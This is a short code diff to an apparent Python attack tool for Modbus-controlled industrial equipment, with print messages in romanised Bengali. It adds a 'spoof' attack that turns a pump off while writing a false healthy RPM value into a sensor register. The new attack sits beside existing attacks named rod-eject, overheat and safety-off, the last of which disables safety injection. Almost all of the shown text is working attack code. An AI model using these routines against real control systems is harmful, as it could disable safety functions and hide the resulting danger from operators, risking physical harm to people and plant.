@@ -44,6 +44,12 @@ def attack_overheat(cl, slave):
     cl.write_register(HR_FLOW, 10, slave=slave)
 
 
+def attack_spoof(cl, slave):
+    print("[attack] pump OFF kore RPM sensor 1800 'healthy' dekhacchi (false data injection)...")
+    cl.write_coil(CO_PUMP, False, slave=slave)
+    cl.write_register(5, 1800, slave=slave)
+
+
 def attack_safety_off(cl, slave):
     print("[attack] safety injection disable korchi...")
     cl.write_coil(CO_SAFETY, False, slave=slave)
@@ -54,6 +60,7 @@ ATTACKS = {
     "rod-eject": attack_rod_eject,
     "overheat": attack_overheat,
     "safety-off": attack_safety_off,
+    "spoof": attack_spoof,
 }
 
 
